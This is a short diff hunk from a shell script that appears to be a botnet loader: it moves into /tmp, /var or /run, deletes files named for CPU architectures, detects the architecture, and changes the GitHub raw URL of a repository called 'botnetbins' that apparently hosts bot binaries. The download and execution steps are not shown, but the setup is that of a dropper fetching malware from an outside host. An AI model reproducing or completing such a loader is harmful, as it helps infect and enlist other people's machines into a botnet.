@@ -4,7 +4,7 @@ cd /tmp || cd /var || cd /run
 rm -rf bot x86 arm mips
 
 ARCH=$(uname -m)
-REPO_URL="https://raw.githubusercontent.com/ST4R-SHINY/botnetbins/main"
+REPO_URL="https://raw.githubusercontent.com/XDomi216/botnetbins/main/"
 
 echo "Detecting architecture: $ARCH"
 
